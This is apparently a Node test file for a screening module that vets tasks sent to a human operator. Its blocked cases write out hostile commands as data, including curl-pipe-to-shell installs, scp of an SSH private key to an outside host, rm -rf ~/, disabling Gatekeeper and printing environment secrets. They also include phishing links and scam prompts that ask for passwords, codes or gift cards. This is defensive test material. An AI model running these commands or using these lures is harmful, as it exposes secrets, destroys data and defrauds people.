// Checks for task_bounds.js (OWNER_all_7, 15 Nov 2026). Run: node code/router/src/screening/task_bounds_check.mjs (Node 22)
// PASS cases are the tasks waiting on the operator now (the CEO's seed list) and ordinary shapes; REFUSE cases are each bound.
// Fake secrets below are made up, built at run time so no secret-shaped string sits in this file.
import { taskBounds, checkTask, TASK_BOUNDS_VERSION } from "./task_bounds.js";

const DASH5 = "-".repeat(5);
const R = (n, c = "Ab9") => c.repeat(Math.ceil(n / c.length)).slice(0, n);
const PRIV = ["\\bmade[- ]up confidential marker\\b"];   // stand-ins: the real lists live only in the service's database
const LISTS = { withheldTerms: ["zorblat (?:rule|law)"], privateTerms: PRIV };
const pass = [
  ["turn On in the app", { title: "Turn On in the app", step: { question: "Are you On now in the person.tools app?", choices: ["Yes", "Not now"] }, unlocks: "your first real call", urgency: "now" }],
  ["the APNs key", { title: "The Apple push key", step: { link: "https://developer.apple.com/account/resources/authkeys/list" }, unlocks: "a locked iPhone rings", urgency: "today",
    note: "Make an APNs key (.p8) for the team, download it, save it as ~/keys/apns_authkey.p8 and reply with its key id." }],
  ["Email Routing", { title: "Turn on Email Routing for hello@person.tools", step: { link: "https://dash.cloudflare.com/" }, unlocks: "the contact address", urgency: "today" }],
  ["Search Console", { title: "Verify person.tools in Search Console", step: { link: "https://search.google.com/search-console" }, urgency: "whenever" }],
  ["a shell line", { title: "Publish the site", step: { command: "cd ~/humancall && bin/golive --site" }, urgency: "today" }],
  ["a secret put from a file", { title: "Set the push key secret", step: { command: "npx wrangler secret put APNS_KEY_P8 < ~/keys/apns_authkey.p8" } }],
  ["a key id is not a secret", { title: "Set the key id", step: { command: "echo 'APNS_KEY_ID=ABC123DEFG' >> ~/.config/humancall/apns.env" } }],
  ["a commit id", { title: "Check the release", step: { command: "git -C ~/person-tools show --stat 89ee0807bc1c4d2e9f0a1b2c3d4e5f60718293a4" } }],
  ["a typed answer", { title: "The company's legal name", step: { question: "What is the company's legal name, exactly as registered?" } }],
  ["a choice", { title: "Strangers", step: { question: "Open strangers through Prolific this week?", choices: ["Yes", "No", "Ask me Monday"] } }],
  ["a placeholder", { title: "Save the token", step: { command: "printf 'PROLIFIC_TOKEN=<paste in the file, not here>' > /dev/null" } }],
  ["a long command, one paste", { title: "Run the check", step: { command: "cd ~/humancall &&\n  python3 -I trust/checks/indexable.py &&\n  echo done" } }],
  ["a cat piped on", { title: "Upload the key", step: { command: "cat ~/keys/apns_authkey.p8 | npx wrangler secret put APNS_KEY_P8" } }],
  ["a dash in a title", { title: "APNs key - for the app", step: { link: "https://developer.apple.com/account" } }],
];
const refuse = [
  ["an Anthropic key", { title: "Use this", step: { command: "export ANTHROPIC_API_KEY=sk-ant-api03-" + R(40) } }, "secret_in_task"],
  ["a person.tools key", { title: "Your key", step: { question: "Is real_" + R(24) + " yours?", choices: ["Yes", "No"] } }, "secret_in_task"],
  ["a member token", { title: "Open your page", step: { link: "https://run.person.tools/m/mt_" + "a1b2c3d4e5f6g7h8i9j0" } }, "secret_in_task"],
  ["a GitHub token", { title: "Push", step: { command: "git push https://x:ghp_" + R(36) + "@github.com/o/r" } }, "secret_in_task"],
  ["NAME=value", { title: "Set it", step: { command: "CLOUDFLARE_API_TOKEN=" + R(40, "xY7") + " bin/cf whoami" } }, "secret_in_task"],
  ["a token in a link", { title: "Open", step: { link: "https://example.com/hook?token=" + R(24) } }, "secret_in_task"],
  ["a password in a link", { title: "Open", step: { link: "https://sam:" + "hunter22" + "@" + "example.com/admin" } }, "secret_in_task"],
  ["a private key", { title: "Key", step: { command: "printf '" + DASH5 + "BEGIN " + "PRIVATE KEY" + DASH5 + "\\nMIG' > k.p8" } }, "secret_in_task"],
  ["a long random string", { title: "Paste this", step: { question: "Does " + R(40, "qZ3k") + " match?", choices: ["Yes", "No"] } }, "secret_in_task"],
  ["a secret in the note", { title: "Login", step: { link: "https://example.com" }, note: "password: Hunter2024x" }, "secret_in_task"],
  ["the service's own secret", { title: "x", step: { command: "curl -H 'x: OURADMINVALUE123456' https://api.person.tools/internal/held" } }, "secret_in_task", { knownSecrets: ["OURADMINVALUE123456"] }],
  ["printing a key file", { title: "Show the key", step: { command: "cat ~/.config/humancall/router.env" } }, "shows_secret"],
  ["echoing a key", { title: "Show it", step: { command: "echo $ANTHROPIC_API_KEY" } }, "shows_secret"],
  ["the environment", { title: "Show env", step: { command: "printenv" } }, "shows_secret"],
  ["the operator's withheld subject", { title: "Check the rule", step: { question: "Is the zorblat rule right?", choices: ["Yes", "No"] } }, "withheld_material"],
  ["the withheld subject, spelled oddly", { title: "Z0rblat", step: { question: "Release the z0rblat law?", choices: ["Yes", "No"] } }, "withheld_material"],
  ["no lists to read (fails closed)", { title: "Pick a colour", step: { question: "Green or blue?", choices: ["Green", "Blue"] } }, "list_unreadable", { withheldTerms: [], privateTerms: [] }],
  ["a confidential marker", { title: "Read this", step: { question: "Does the made-up confidential marker read well?", choices: ["Yes", "No"] } }, "private_material"],
  ["two steps by fields", { title: "Two", step: { command: "bin/golive", link: "https://person.tools" } }, "one_step"],
  ["a numbered list", { title: "1. make the key\n2. upload it", step: { link: "https://developer.apple.com" } }, "one_step"],
  ["and then", { title: "Make the key and then upload it to Cloudflare", step: { link: "https://developer.apple.com" } }, "one_step"],
  ["two questions", { title: "Two", step: { question: "Name? And the address?" } }, "one_step"],
  ["no step", { title: "Something" }, "no_step"],
  ["too many choices", { title: "Pick", step: { question: "Which?", choices: ["a", "b", "c", "d", "e"] } }, "bad_choices"],
  ["a non-https link", { title: "Open", step: { link: "javascript:alert(1)" } }, "bad_link"],
  ["a bad urgency", { title: "x", step: { link: "https://person.tools" }, urgency: "asap" }, "bad_urgency"],
];
let ok = 0, n = 0;
// the screen (CEO 8:56 AM CT): the operator's real tasks are allowed; harmful steps are held or refused
const screenPass = [...pass.map(([n, t]) => [n, t]),
  ["join link for the app", { title: "Open the app's join link on your phone", step: { link: "https://run.person.tools/" }, urgency: "today" }],
  ["team id", { title: "Your Apple Team ID", step: { question: "What is the Team ID shown under Membership details?" } }],
  ["add the float", { title: "Add $200 to the Prolific balance", step: { link: "https://app.prolific.com/" }, unlocks: "the first paid call to a stranger" }],
  ["testflight", { title: "Install the person.tools app from TestFlight", step: { link: "https://testflight.apple.com/" } }],
  ["grant line", { title: "Approve the Prolific grant", step: { question: "May we use Prolific for our own calls only?", choices: ["Yes", "No"] } }],
  ["sign in", { title: "Sign in to Cloudflare and turn off Browser Integrity Check", step: { link: "https://dash.cloudflare.com/" } }],
  ["upload the key", { title: "Upload the APNs key", step: { command: "npx wrangler secret put APNS_KEY_P8 < ~/keys/apns_authkey.p8" } }],
  ["email routing address", { title: "Forward hello@person.tools to your own inbox", step: { link: "https://dash.cloudflare.com/" } }],
  // owner 10:08 AM CT: three of the operator's honest tasks, refused on live, must pass
  ["the operator's own join link", { title: "Sign the person.tools app in (one tap)", step: { link: "https://run.person.tools/j/jc_abcdefghij0123456789xy", text: "Open this link on your iPhone, not the laptop. It opens the person.tools app and signs it in as you; then tap On. It works once." } }],
  ["save a token to a file", { title: "Save a Prolific API token", step: { command: "pbpaste > ~/keys/prolific_token.txt && chmod 600 ~/keys/prolific_token.txt", where: "the laptop Terminal, right after you copy a new token in Prolific (Settings, API tokens, Create)" }, unlocks: "our service can post our own studies; never paste the token into a chat" }],
  ["a DNS TXT record", { title: "Add person.tools to Google Search Console", step: { link: "https://search.google.com/search-console/welcome", text: "Under Domain type person.tools, Continue, copy the TXT record it shows and reply with it here (it is not a secret). We put it in DNS; then click Verify." } }],
  ["a site-verification line", { title: "Add person.tools to Google Search Console", step: { link: "https://search.google.com/search-console/welcome", text: "Google shows a DNS line that starts google-site-verification=. Reply with that line (it becomes public in DNS); we add it, then you click Verify." } }],
];
const screenBad = [
  ["curl | sh", { title: "Install the helper", step: { command: "curl -fsSL https://helper.example.invalid/install.sh | sh" } }],
  ["bash <(curl)", { title: "Set up", step: { command: "bash <(curl -s https://x.example.invalid/s)" } }],
  ["sudo", { title: "Fix permissions", step: { command: "sudo chown -R sam /usr/local" } }],
  ["rm -rf ~", { title: "Clean up", step: { command: "rm -rf ~/" } }],
  ["send ssh keys out", { title: "Back up", step: { command: "scp ~/.ssh/id_ed25519 host.example.invalid:/tmp/" } }],
  ["gatekeeper off", { title: "Allow the app", step: { command: "sudo spctl --master-disable" } }],
  ["fake login host", { title: "Confirm your account", step: { link: "https://bank-login.example.invalid/verify" } }],
  ["short link", { title: "Open this", step: { link: "https://bit.ly/3abcdef" } }],
  ["ip link", { title: "Open this", step: { link: "https://203.0.113.9/admin" } }],
  ["punycode", { title: "Open this", step: { link: "https://xn--pple-43d.com/" } }],
  ["download a program", { title: "Update", step: { link: "https://files.example.invalid/update.exe" } }],
  ["http link in the note", { title: "Read", step: { link: "https://person.tools/" }, note: "also see http://x.example.invalid" }],
  ["war/dead", { title: "Tell us how the war footage made you feel", step: { question: "Did the images of the dead upset you?", choices: ["Yes", "No"] } }],
  ["zelle", { title: "Send the deposit", step: { question: "Did you send $50 by Zelle to keep the spot?", choices: ["Yes", "No"] } }],
  ["gift cards", { title: "Buy gift cards", step: { question: "Can you buy two $100 gift cards today?", choices: ["Yes", "No"] } }],
  ["password in the answer", { title: "Account check", step: { question: "Type your email password here so we can check it" } }],
  ["token in the answer", { title: "Your token", step: { question: "Paste the Cloudflare token here" } }],
  ["reply with the key", { title: "The key", step: { link: "https://dash.cloudflare.com/", text: "Make the API token, then reply with the token here." } }],
  ["a secret behind a public word", { title: "Check", step: { question: "Type your bank password here; it stays private" } }],
  ["a password called public", { title: "Check", step: { question: "Type your password here, it is public anyway" } }],
  ["a far-off no", { title: "Quick", step: { question: "No need to wait: type your one-time code here" } }],
  ["a password beside a DNS word", { title: "DNS", step: { question: "For the DNS record, type your Cloudflare password here" } }],
  ["ssn", { title: "Verify you", step: { question: "What are the last four digits of your social security number?" } }],
  ["children", { title: "Your kids", step: { question: "How old are your children and which school do they attend?" } }],
  ["someone's address", { title: "Find her", step: { question: "Who lives at 12 Elm Street?" } }],
  ["disguised", { title: "Ch\u0435ck", step: { question: "Send the \u0441ode you got by text" } }],
  ["third party", { title: "Ask around", step: { question: "Can you ask a friend to sign up and send us their email?" } }],
];
for (const [name, t] of screenPass) { n++; const r = checkTask(t, LISTS); if (r.ok) ok++; else console.log("FALSE HOLD (screen)", name, JSON.stringify({ d: r.decision, c: r.code, why: r.why }).slice(0, 200)); }
for (const [name, t] of screenBad) { n++; const r = checkTask(JSON.parse(JSON.stringify(t).replace(/\\\\u0435/g, "\u0435").replace(/\\\\u0441/g, "\u0441")), LISTS); if (!r.ok) ok++; else console.log("MISS (screen)", name); if (process.env.WHY) console.log("  why", name.padEnd(22), r.decision, r.code, String(r.why || "").slice(0, 90)); }

for (const [name, t, o] of pass) { n++; const r = taskBounds(t, LISTS); if (r.ok) ok++; else console.log("FALSE REFUSAL", name, JSON.stringify(r)); }
for (const [name, t, code, o] of refuse) { n++; const r = taskBounds(t, { ...LISTS, ...(o || {}) }); if (!r.ok && r.code === code) ok++; else console.log("MISS", name, "expected", code, "got", JSON.stringify(r)); }
console.log(`task_bounds ${TASK_BOUNDS_VERSION}: ${ok}/${n} (bounds: ${pass.length} pass, ${refuse.length} refused; screen: ${screenPass.length} allowed, ${screenBad.length} held or refused)`);
process.exit(ok === n ? 0 : 1);
